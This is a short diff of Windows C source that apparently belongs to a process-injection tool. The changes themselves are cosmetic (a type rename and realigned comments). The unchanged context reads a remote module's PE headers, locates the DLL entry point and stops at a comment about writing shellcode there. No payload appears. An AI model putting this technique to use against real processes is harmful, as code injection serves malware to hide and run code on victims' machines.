@@ -2,7 +2,7 @@
 #include <Windows.h>
 #include <Psapi.h>
 
-int main()
+INT main()
 {
 	STARTUPINFOA			startupInfo;
 	PROCESS_INFORMATION		processInformation;
@@ -74,9 +74,9 @@ Continue:
 
 			ReadProcessMemory(hProcess, hRemoteModule, lpTargetProcessHeaderBuffer, headerBufferSize, NULL);
 
-			CONST PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpTargetProcessHeaderBuffer;  // NOLINT(misc-misplaced-const)
+			CONST PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpTargetProcessHeaderBuffer;												// NOLINT(misc-misplaced-const)
 			CONST PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpTargetProcessHeaderBuffer + dosHeader->e_lfanew);
-			CONST LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hRemoteModule);  // NOLINT(misc-misplaced-const)
+			CONST LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hRemoteModule);					// NOLINT(misc-misplaced-const)
 			printf("[*] Dll entryPoint at: %p\n", dllEntryPoint);
 
 			// write shellcode to DLL's AddressofEntryPoint
